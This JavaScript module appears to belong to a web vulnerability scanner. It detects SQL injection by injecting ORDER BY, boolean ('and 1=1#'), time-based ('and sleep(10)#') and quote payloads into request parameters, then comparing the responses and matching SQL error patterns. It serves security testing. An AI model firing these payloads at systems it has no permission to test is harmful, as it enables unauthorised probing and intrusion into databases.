// comprehensive blind sql injection engine

import { Attack, Mutator } from './attack.js';
import { Request } from '../http/request.js';
import { logVerbose } from '../utils/log.js';

export default class ModSql extends Attack {
    constructor(crawler, persister, options, crawlerConfig) {
        super(crawler, persister, options, crawlerConfig);
        this.moduleName = 'sql';
    }

    async attack(request) {
        // fetch baseline for comparson
        let defaultResponse = null;
        try {
            defaultResponse = await this.crawler.send(request);
        } catch (error) {
            return; // if we cant get a baseline, we cant do blind comparison
        }

        if (!defaultResponse || !defaultResponse.content) return;

        const baseContent = defaultResponse.content;

        const prefixes = ["", "'", '"'];
        const getParams = request.getParams || [];
        const postParams = typeof request.postParams !== 'string' ? (request.postParams || []) : [];

        const testParameter = async (paramName, paramValue, isPost) => {
            if (this.options.skippedParams && this.options.skippedParams.includes(paramName)) return;

            const sendMutated = async (payload) => {
                const mutatedGet = request.getParams.map(p => [...p]);
                const mutatedPost = typeof request.postParams !== 'string' ? request.postParams.map(p => [...p]) : request.postParams;

                if (!isPost) {
                    const idx = mutatedGet.findIndex(p => p[0] === paramName);
                    if (idx !== -1) mutatedGet[idx][1] = paramValue + payload;
                } else {
                    const idx = mutatedPost.findIndex(p => p[0] === paramName);
                    if (idx !== -1) mutatedPost[idx][1] = paramValue + payload;
                }

                const mutatedReq = new Request(request.path, {
                    method: request.method,
                    getParams: mutatedGet,
                    postParams: mutatedPost,
                    referer: request.referer,
                    linkDepth: request.linkDepth,
                    enctype: request.enctype
                });
                mutatedReq.pathId = request.pathId;

                const startTime = Date.now();
                try {
                    logVerbose(`[*] [sql] fuzzing ${paramName} with payload: ${paramValue + payload}`);
                    const res = await this.crawler.send(mutatedReq);
                    return { content: res.content, time: (Date.now() - startTime) };
                } catch (error) {
                    return { error: error.code, time: (Date.now() - startTime) };
                }
            };

            for (const prefix of prefixes) {
                // 1. Union-Based / Order By Inference
                const unionTrue = `${prefix} order by 1#`;
                const unionFalse = `${prefix} order by 1000#`;

                const resUnionTrue = await sendMutated(unionTrue);
                const resUnionFalse = await sendMutated(unionFalse);

                if (resUnionTrue && resUnionFalse && !resUnionTrue.error && !resUnionFalse.error) {
                    if (this.isResponseSimilar(baseContent, resUnionTrue.content) && !this.isResponseSimilar(resUnionTrue.content, resUnionFalse.content)) {
                        this.logVulnerability(
                            'SQL Injection',
                            request,
                            `Union-Based SQLi (Order By inference) found via parameter ${paramName}`,
                            paramName,
                            'WSTG-INPV-05'
                        );
                        return true;
                    }
                }

                // 2. Boolean-Based Blind Inference
                const boolTrue = `${prefix} and 1=1#`;
                const boolFalse = `${prefix} and 1=2#`;

                const resBoolTrue = await sendMutated(boolTrue);
                const resBoolFalse = await sendMutated(boolFalse);

                if (resBoolTrue && resBoolFalse && !resBoolTrue.error && !resBoolFalse.error) {
                    if (this.isResponseSimilar(baseContent, resBoolTrue.content) && !this.isResponseSimilar(resBoolTrue.content, resBoolFalse.content)) {
                        this.logVulnerability(
                            'SQL Injection',
                            request,
                            `Boolean-Based Blind SQLi found via parameter ${paramName}`,
                            paramName,
                            'WSTG-INPV-05'
                        );
                        return true;
                    }
                }

                // 3. Time-Based Blind Inference
                const timePayload = `${prefix} and sleep(10)#`;
                const resTime = await sendMutated(timePayload);

                // if the crawler timed out (ECONNABORTED > 4.5s) or it suceeded but took >= 9s
                if ((resTime.error === 'ECONNABORTED' && resTime.time > 4500) || (resTime.time >= 9000)) {
                    // confirm it's not simply a slow connection by ensuring sleep(0) is fast
                    const controlPayload = `${prefix} and sleep(0)#`;
                    const resControl = await sendMutated(controlPayload);
                    if ((!resControl.error) && resControl.time < 4000) {
                        this.logVulnerability(
                            'SQL Injection',
                            request,
                            `Time-Based Blind SQLi found via parameter ${paramName}`,
                            paramName,
                            'WSTG-INPV-05'
                        );
                        return true;
                    }
                }
            }

            // 4. Fallback Error-Based SQLi Check
            const errorPayload = `'`;
            const resError = await sendMutated(errorPayload);
            if (resError && resError.content) {
                const SQL_ERROR_PATTERNS = [
                    /you have an error in your sql syntax/i,
                    /warning.*mysql/i,
                    /unclosed quotation mark/i,
                    /sqlite.*error/i,
                    /pg_query\(\)/i,
                    /sql.*syntax.*error/i
                ];
                for (const pattern of SQL_ERROR_PATTERNS) {
                    if (pattern.test(resError.content)) {
                        this.logVulnerability(
                            'SQL Injection',
                            request,
                            `Error-Based SQLi found via parameter ${paramName}`,
                            paramName,
                            'WSTG-INPV-05'
                        );
                        return true;
                    }
                }
            }
            return false;
        };

        for (const [paramName, paramValue] of getParams) {
            await testParameter(paramName, paramValue, false);
        }

        for (const [paramName, paramValue] of postParams) {
            await testParameter(paramName, paramValue, true);
        }
    }
}
